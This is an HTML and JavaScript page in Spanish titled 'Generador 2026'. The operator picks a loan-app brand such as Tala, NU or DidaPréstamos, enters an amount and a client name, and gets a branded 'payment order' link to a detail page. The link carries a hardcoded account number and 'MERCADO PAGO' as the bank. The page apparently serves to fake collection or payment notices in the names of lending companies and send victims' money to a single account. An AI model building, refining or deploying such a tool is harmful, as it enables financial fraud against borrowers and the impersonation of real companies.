<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Generador 2026</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
        body { font-family: 'Inter', sans-serif; background: #0b1120; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 10px; }
        .app-card { width: 100%; max-width: 440px; background: #ffffff; border-radius: 2rem; overflow: hidden; box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
        
        /* Contenedor de Apps Tipo Botones Gigantes */
        .selector-box {
            max-height: 200px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 8px;
            padding: 10px;
            background: #f1f5f9;
            border-radius: 1rem;
            margin: 10px 20px;
        }

        .opcion-app {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 12px;
            background: #1e293b; /* Fondo oscuro para que el texto se vea */
            color: #ffffff !important;
            font-weight: 900;
            font-size: 14px;
            text-transform: uppercase;
            text-align: center;
            cursor: pointer;
        }

        .opcion-app:active { transform: scale(0.98); opacity: 0.8; }
        .selected { border: 4px solid #14b8a6 !important; background: #0f172a; }
    </style>
</head>
<body>

    <div class="app-card">
        <div id="header-bg" class="bg-[#1e293b] pt-8 pb-4 text-center text-white transition-all">
            <h2 id="app-titulo" class="text-xl font-black uppercase tracking-tighter">Selecciona una Aplicación</h2>
            <p class="text-[10px] opacity-60 font-bold">TOCA EL NOMBRE DE LA APP ABAJO</p>
        </div>

        <div class="selector-box">
            <button onclick="fijar('TALA PRÉSTAMOS', '#14b8a6', this)" class="opcion-app">Tala Préstamos</button>
            <button onclick="fijar('PRÉSTAMOS NU', '#820ad1', this)" class="opcion-app">Préstamos NU</button>
            <button onclick="fijar('DIDAPRÉSTAMOS', '#2563eb', this)" class="opcion-app">DidaPréstamos</button>
            <button onclick="fijar('PRÉSTAMOS RÁPIDOS', '#10b981', this)" class="opcion-app">Préstamos Rápidos</button>
            <button onclick="fijar('WORLDMOXPRO GG', '#6366f1', this)" class="opcion-app">WorldmoxPro GG</button>
            <button onclick="fijar('TALA CRÉDITO', '#0891b2', this)" class="opcion-app">Tala Crédito</button>
            <button onclick="fijar('MOVIL CASH', '#f59e0b', this)" class="opcion-app">Movil Cash</button>
            <button onclick="fijar('PRÉSTAMOS DE DINERO', '#db2777', this)" class="opcion-app">Préstamos de Dinero</button>
            <button onclick="fijar('PRÉSTAMOS', '#475569', this)" class="opcion-app">Préstamos (General)</button>
        </div>

        <div class="p-6 space-y-4">
            <div class="bg-slate-100 p-4 rounded-2xl text-center">
                <span class="text-[10px] font-bold text-slate-400 uppercase">Monto a Pagar</span>
                <input type="number" id="monto" value="0.00" class="w-full bg-transparent text-3xl font-black text-center outline-none text-slate-800">
            </div>

            <input type="text" id="nom" placeholder="NOMBRE DEL CLIENTE" class="w-full border-b-2 py-3 text-center font-bold uppercase outline-none focus:border-blue-500">

            <button onclick="crearLink()" id="btn-final" class="w-full bg-[#1e293b] text-white py-5 rounded-2xl font-black uppercase tracking-widest">
                Generar Orden de Pago
            </button>
        </div>
    </div>

    <script>
        let appSeleccionada = "TALA PRÉSTAMOS";
        let colorSeleccionado = "#1e293b";

        function fijar(nombre, color, elemento) {
            appSeleccionada = nombre;
            colorSeleccionado = color;
            
            // UI Update
            document.getElementById('header-bg').style.backgroundColor = color;
            document.getElementById('app-titulo').innerText = nombre;
            document.getElementById('btn-final').style.backgroundColor = color;
            
            // Marcar seleccionado
            document.querySelectorAll('.opcion-app').forEach(b => b.classList.remove('selected'));
            elemento.classList.add('selected');
        }

        function crearLink() {
            const params = new URLSearchParams({
                m: document.getElementById('monto').value,
                n: document.getElementById('nom').value || "CLIENTE",
                f: new Date().toISOString().split('T')[0],
                pr: appSeleccionada,
                cl: "703010052250010635",
                b: "MERCADO PAGO",
                s: Date.now()
            });
            window.location.href = `detalle.html?${params.toString()}`;
        }
    </script>
</body>
</html>
